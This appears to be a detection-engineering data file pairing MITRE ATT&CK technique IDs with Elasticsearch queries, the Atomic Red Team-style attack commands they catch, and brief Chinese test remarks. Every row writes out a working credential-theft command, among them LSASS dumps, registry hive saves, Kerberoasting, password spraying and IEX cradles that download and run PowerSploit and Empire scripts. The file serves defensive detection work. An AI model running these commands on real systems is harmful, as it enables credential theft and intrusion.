T1552.004,"{
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""get-process lsass""}},
                        {""match"": {""CommandLine"": ""MiniDump""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.ps1""}},
                        {""wildcard"": {""CommandLine"": ""*.dll""}},
                        {""wildcard"": {""CommandLine"": ""*.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); 
get-process lsass | Out-Minidump

C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full",没日志（被拦截疑）,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Outflank-Dumpert.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe,2,
T1555,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                    {""match_phrase"": {""CommandLine"": ""Get-CredManCreds""}},
                    {""match_phrase"": {""CommandLine"": ""Get-PasswordVaultCredentials""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); 
Get-CredManCreds -Force

IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force",2,
T1003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Get-NetTCPConnection -LocalPort""}},
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-Process svchost""}},
                        {""wildcard"": {""CommandLine"": ""*.OwningProcess""}},
                        {""wildcard"": {""CommandLine"": ""*dump*""}},
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); 
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full",2,
T1003.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""PsExec*""}},
                    {""match_phrase"": {""CommandLine"": ""reg save""}},
                    {""match_phrase"": {""CommandLine"": ""security\\policy\\secrets""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003.004\bin\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y,2(被45识别),
T1558.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""System.IdentityModel""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                         {""match"": {""CommandLine"": ""-T""}},
                        {""match"": {""CommandLine"": ""-Q""}}
      ]
     }
    } ,
        {""bool"":{
          ""must"":[
                        {""wildcard"":{""CommandLine"": ""setspn*""}}
                    ]
     }
    },
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",setspn -T %USERDNSDOMAIN% -Q */*,2,
T1552.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"":{""CommandLine"": ""findstr""}},
                        {""match_phrase"": {""CommandLine"": ""select-string""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""pass*""}},        
                        {""wildcard"": {""CommandLine"": ""*.xml""}},
                        {""wildcard"": {""CommandLine"": ""*.doc""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""*.xls""}}
      ],
       ""minimum_should_match"": 1
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","findstr /si pass *.xml *.doc *.txt *.xls; 
ls -R | select-string -Pattern password",,
T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[         
                        {""match"":{""CommandLine"": ""foreach""}},
                        {""match_phrase"":{""CommandLine"": ""Get-ChildItem""}},
                        {""match_phrase"":{""CommandLine"": ""Where-Object""}},
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": "".key""}},
                        {""match"": {""CommandLine"": "".pgp""}},
                        {""match"": {""CommandLine"": "".gpg""}},
                        {""match"": {""CommandLine"": "".ppk""}},
                        {""match"": {""CommandLine"": "".p12""}},
                        {""match"": {""CommandLine"": "".pem""}},
                        {""match"": {""CommandLine"": "".pfx""}},
                        {""match"": {""CommandLine"": "".cer""}},
                        {""match"": {""CommandLine"": "".p7b""}},
                        {""match"": {""CommandLine"": "".asc""}},
                        {""match"": {""CommandLine"": "".crt""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","foreach($i in @("".key"","".pgp"","".gpg"","".ppk"","".p12"","".pem"","".pfx"","".cer"","".p7b"","".asc"","".crt"")){Get-ChildItem -Path c:\ -Depth 3 -File -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.name -Match ""$i$""}}",3,
T1552.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Get-GPPPassword""}},
                    {""match"": {""CommandLine"": ""-Verbose""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",". PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1; 
Get-GPPPassword -Verbose",2,
T1552.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""findstr*""}},
                        {""match"": {""CommandLine"": ""/S""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""*pass*""}},        
                        {""wildcard"": {""CommandLine"": ""*.xml""}},
                        {""wildcard"": {""CommandLine"": ""*.doc""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""sysvol*""}}
      ],
       ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",findstr /S cpassword %logonserver%\sysvol\*.xml,2,
T1558.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Get-DomainUser""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"":{""CommandLine"": ""-PreauthNotRequired""}},
                        {""match"":{""CommandLine"": ""-Properties""}},
                        {""wildcard"":{""CommandLine"": ""PowerView*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose",没日志,
T1003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""gsecdump*""}},
                    {""match"": {""CommandLine"": ""-a""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",PathToAtomicsFolder\T1003\bin\gsecdump.exe -a,2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""pypykatz*""}},
                    {""wildcard"": {""CommandLine"": ""lsa*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",pypykatz live lsa,2,
T1003.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""pypykatz*""}},
                    {""wildcard"": {""CommandLine"": ""registry*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",pypykatz live registry,2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""mimikatz*""}},
                        {""match"":{""CommandLine"": ""sekurlsa""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""*.DMP""}},
                        {""match"":{""CommandLine"": ""logonpasswords""}},
                        {""match"":{""CommandLine"": ""minidump""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","PathToAtomicsFolder\T1003.001\bin\mimikatz.exe ""sekurlsa::minidump %tmp%\lsass.DMP"" ""sekurlsa::logonpasswords full"" exit",2,
T1003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""totallylegit*""}},
                    {""wildcard"": {""CommandLine"": ""*.dmp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",.\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp,2,
T1110.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""hashcat*""}},
                        {""match"":{""CommandLine"": ""-r""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""*.rule""}},
                        {""wildcard"":{""CommandLine"": ""*.txt""}},
                        {""wildcard"":{""CommandLine"": ""*.lst""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cd %temp%\hashcat6\hashcat-6.1.1\hashcat.exe\.. 
&& %temp%\hashcat6\hashcat-6.1.1\hashcat.exe -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst",2,
T1110.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Invoke-DomainPasswordSpray""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"":{""CommandLine"": ""-Password""}},
                        {""match"":{""CommandLine"": ""-Domain""}},
                        {""wildcard"":{""CommandLine"": ""*PasswordSpray*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); 
Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force",2,
T1110.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""Get-ADUser -LDAPFilter""}},
                        {""match_phrase"":{""CommandLine"": ""Select-Object -ExpandProperty""}},
                        {""wildcard"": {""CommandLine"": ""System.DirectoryServices.Protocols*""}},
                        {""wildcard"":{""CommandLine"": ""*NTLM""}},
                        {""match_phrase"":{""CommandLine"": ""Foreach-Object""}},
                        {""match"":{""CommandLine"": ""try""}},
                        {""wildcard"":{""CommandLine"": ""*.bind""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""System.Net.NetworkCredential""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {;
   Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported"";
   exit 1; 
}; 
$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName; [System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null; 
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389); $DomainUsers | Foreach-Object {;
   $user = $_;
   $password = 'P@ssw0rd!';
   $credz = new-object System.Net.NetworkCredential($user, $password, ""$env:UserDnsDomain"");
   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);
   try {;
     Write-Host "" [-] Attempting ${password} on account ${user}."";
     $conn.bind();
     Write-Host "" [!] ${user}:${password} are valid credentials!"";
   } catch {;
     Write-Host $_.Exception.Message;
   }; 
}; 
Write-Host ""End of password spraying""",2,
T1187,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""PetitPotam*""}},
                    {""wildcard"": {""CommandLine"": ""*.*.*.*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","& ""$env:TEMP\PetitPotam.exe"" 10.0.0.3 10.0.0.2 1; 
Write-Host ""End of PetitPotam attack""",2,
T1003.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Import-Module""}},
                    {""match_phrase"": {""CommandLine"": ""Invoke-PowerDump""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (Test-Path ""$Env:Temp\PowerDump.ps1"") { ;
 } else {Invoke-Webrequest -Uri ""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"" -UseBasicParsing -OutFile ""$Env:Temp\PowerDump.ps1""};  ;  
Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green; 
Import-Module ""$Env:Temp\PowerDump.ps1""; 
Invoke-PowerDump",2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-Mimikatz""}},
                        {""match"":{""CommandLine"": ""-DumpCreds""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                     
                        {""wildcard"":{""CommandLine"": ""invoke-mimi*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module .\invoke-mimi.ps1;
Invoke-Mimikatz -DumpCreds

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadString(""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1"");
iex $result; 
Invoke-Mimikatz -DumpCreds",2没日志（恶意软件）,
T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""findstr*""}},
                        {""match"": {""CommandLine"": ""/e""}}
                    ]
     }
    },
           {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": "".docx""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"":{""CommandLine"": ""dir*""}},
                        {""match"": {""CommandLine"": "".pgp""}},
                        {""match"": {""CommandLine"": "".gpg""}},
                        {""match"": {""CommandLine"": "".ppk""}},
                        {""match"": {""CommandLine"": "".p12""}},
                        {""match"": {""CommandLine"": "".pem""}},
                        {""match"": {""CommandLine"": "".pfx""}},
                        {""match"": {""CommandLine"": "".cer""}},
                        {""match"": {""CommandLine"": "".p7b""}},
                        {""match"": {""CommandLine"": "".asc""}},
                        {""match"": {""CommandLine"": "".key""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",dir c:\ /b /s .key | findstr /e .key,2,
T1003.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"":{""CommandLine"": ""reg save""}}
                    ]
     }
    }, 
{""bool"":{
     ""must_not"":[
                        {""wildcard"": {""CommandLine"": ""PsExec*""}},
                          {""wildcard"":{""CommandLine"": ""copy*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"":{""CommandLine"": ""HKLM\\sam""}},
                        {""match_phrase"":{""CommandLine"": ""HKLM\\system""}}, 
                        {""match_phrase"":{""CommandLine"": ""HKLM\\security""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg save HKLM\sam %temp%\sam 
&& reg save HKLM\system %temp%\system 
&& reg save HKLM\security %temp%\security",2,
T1558.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Add-Type""}},
                    {""match_phrase"": {""CommandLine"": ""System.IdentityModel.Tokens.KerberosRequestorSecurityToken""}},
                    {""match_phrase"":{""CommandLine"": ""New-Object""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Add-Type -AssemblyName System.IdentityModel; 
$ComputerFQDN=$env:LogonServer.trimStart('\') + ""."" + $env:UserDnsDomain; 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""HTTP/$ComputerFQDN""

Add-Type -AssemblyName System.IdentityModel; 
setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }",2,
T1558.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""Invoke-Kerberoast""}},
                    {""match"": {""CommandLine"": ""| fl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if((Get-CIMInstance -Class Win32_ComputerSystem) { ;
 } else {Write-Host Joining this computer to a domain must be done manually};  ;  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing); 
Invoke-Kerberoast | fl",2,
T1558.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"":{""CommandLine"": ""rubeus.exe""}},
                  
                    {""match"": {""CommandLine"": ""/outfile""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cmd.exe /c ""$Env:temp\rubeus.exe"" asreproast /outfile:""$Env:temp\rubeus_output.txt""",2,
T1558.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"":{""CommandLine"": ""rubeus*""}},
                    {""wildcard"":{""CommandLine"": ""kerberoast*""}},
                    {""match"": {""CommandLine"": ""/outfile""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","klist purge; cmd.exe /c ""$Env:temp\rubeus.exe"" kerberoast None /outfile:""$Env:temp\rubeus_output.txt""",2,
T1003.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""Get-ADReplAccount""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Get-ADReplAccount -All -Server,2,
T1040,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""New-NetEventSession""}},
                    {""match"": {""CommandLine"": ""-CaptureMode""}},
                    {""match_phrase"": {""CommandLine"": ""Add-NetEventProvider""}},
                    {""match"": {""CommandLine"": ""-SessionName""}},
                    {""match_phrase"": {""CommandLine"": ""Start-NetEventSession""}},
                    {""wildcard"": {""CommandLine"": ""*.etl""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$path = ""$ENV:UserProfile\Desktop\pcap.etl"";
New-NetEventSession -Name ""PCAP"" -CaptureMode SaveToFile -LocalFilePath $path;
Add-NetEventProvider -Name ""Microsoft-Windows-TCPIP"" -SessionName ""PCAP"";
Start-NetEventSession -Name ""PCAP"";
Start-Sleep -s 60;
Stop-NetEventSession -Name ""PCAP"";
if (Test-Path $path) {
  echo $path;
  exit 0;
} else {
  echo ""Failed to generate PCAP file."";
  exit 1;
};",2,
T1003.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""System32\\config\\SAM""}},
                        {""match_phrase"": {""CommandLine"": ""get-wmiobject win32_shadowcopy""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"":{""CommandLine"": ""System.IO.File""}},
                        {""wildcard"":{""CommandLine"": ""certutil*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","write-host """"; 
$shadowlist = get-wmiobject win32_shadowcopy; 
$volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}; 
$maxvolume = ($volumenumbers | Sort-Object -Descending)[0]; 
$shadowpath = ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"" + $maxvolume + ""\Windows\System32\config\SAM""; 
$mydump = $ENV:temp + '\' + 'myhive'; 
[System.IO.File]::Copy($shadowpath , $mydump)

write-host """"; 
$shadowlist = get-wmiobject win32_shadowcopy; 
$volumenumbers = foreach($shadowcopy in $shadowlist){$shadowcopy.DeviceObject[-1]}; 
$maxvolume = ($volumenumbers | Sort-Object -Descending)[0]; 
$shadowpath = ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"" + $maxvolume + ""\Windows\System32\config\SAM""; 
certutil -f -v -encodehex $shadowpath $ENV:temp\myhive 2",2,
T1003.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""esentutl*""}},
                {""match_phrase"": {""CommandLine"": ""system32/config/SAM""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM,2,
